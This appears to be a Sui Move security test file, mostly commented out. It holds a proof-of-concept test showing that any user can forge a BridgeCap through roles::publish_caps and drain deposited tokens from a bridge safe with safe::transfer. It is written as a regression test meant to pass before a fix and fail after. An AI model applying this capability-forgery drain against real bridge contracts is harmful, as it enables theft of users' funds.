#[test_only]
module bridge_safe::security_tests;



// use bridge_safe::roles::AdminCap;
// use bridge_safe::safe::{Self, BridgeSafe};
// use sui::clock;
// use sui::coin;
// use sui::test_scenario as ts;

// public struct TEST_COIN has drop {}

// const ADMIN: address = @0xa11ce;
// const USER: address = @0xb0b;
// const ATTACKER: address = @0xabad1dea;
// const RECIPIENT_VECTOR: vector<u8> = b"12345678901234567890123456789012";

// const MIN_AMOUNT: u64 = 100;
// const MAX_AMOUNT: u64 = 1_000_000;
// const DEPOSIT_AMOUNT: u64 = 50_000;
// const DRAIN_AMOUNT: u64 = 10_000;

// This test demonstrates the vulnerability: any user can mint a fake BridgeCap
// via roles::publish_caps and then call safe::transfer to drain the BridgeSafe.
//
// Expected behavior:
// - On the vulnerable code (pre-fix), this test PASSES.
// - After fixing capability creating with a witness,
//   this test should fail to compile or fail at runtime,
//   as forging a BridgeCap is no longer possible.

//#[test]
// fun disabled_test_drain_with_forged_bridge_cap() {
//     let mut scenario = ts::begin(ADMIN);
//     {
//         safe::init_for_testing(ts::ctx(&mut scenario));
//     };

//     ts::next_tx(&mut scenario, ADMIN);
//     {
//         let mut safe = ts::take_shared<BridgeSafe>(&scenario);
//         let admin_cap = ts::take_from_sender<AdminCap>(&scenario);

//         safe::whitelist_token<TEST_COIN>(
//             &mut safe,
//             &admin_cap,
//             MIN_AMOUNT,
//             MAX_AMOUNT,
//             true, // is_native
//             false, // is_locked
//             ts::ctx(&mut scenario),
//         );

//         ts::return_shared(safe);
//         ts::return_to_sender(&scenario, admin_cap);
//     };

//     ts::next_tx(&mut scenario, USER);
//     {
//         let mut safe = ts::take_shared<BridgeSafe>(&scenario);
//         let clock = clock::create_for_testing(ts::ctx(&mut scenario));

//         let coin_in = coin::mint_for_testing<TEST_COIN>(DEPOSIT_AMOUNT, ts::ctx(&mut scenario));
//         safe::deposit<TEST_COIN>(
//             &mut safe,
//             coin_in,
//             RECIPIENT_VECTOR,
//             &clock,
//             ts::ctx(&mut scenario),
//         );

//         assert!(safe::get_stored_coin_balance<TEST_COIN>(&mut safe) == DEPOSIT_AMOUNT, 0);

//         clock::destroy_for_testing(clock);
//         ts::return_shared(safe);
//     };

//     ts::next_tx(&mut scenario, ATTACKER);
//     {
//         // Forge a fresh AdminCap and BridgeCap as an arbitrary user
//         let (_fake_admin_cap, fake_bridge_cap) = bridge_safe::roles::publish_caps(
//             ts::ctx(&mut scenario),
//         );

//         let mut safe = ts::take_shared<BridgeSafe>(&scenario);

//         // Attempt to transfer funds from BridgeSafe to the attacker using the forged BridgeCap
//         let success = safe::transfer<TEST_COIN>(
//             &mut safe,
//             &fake_bridge_cap,
//             ATTACKER,
//             DRAIN_AMOUNT,
//             ts::ctx(&mut scenario),
//         );
//         assert!(success, 1);

//         // Verify that safe's stored balance decreased by the drained amount
//         assert!(
//             safe::get_stored_coin_balance<TEST_COIN>(&mut safe) == (DEPOSIT_AMOUNT - DRAIN_AMOUNT),
//             2,
//         );

//         ts::return_shared(safe);
//         transfer::public_transfer(_fake_admin_cap, ATTACKER);
//         transfer::public_transfer(fake_bridge_cap, ATTACKER);
//     };

//     ts::end(scenario);
// }
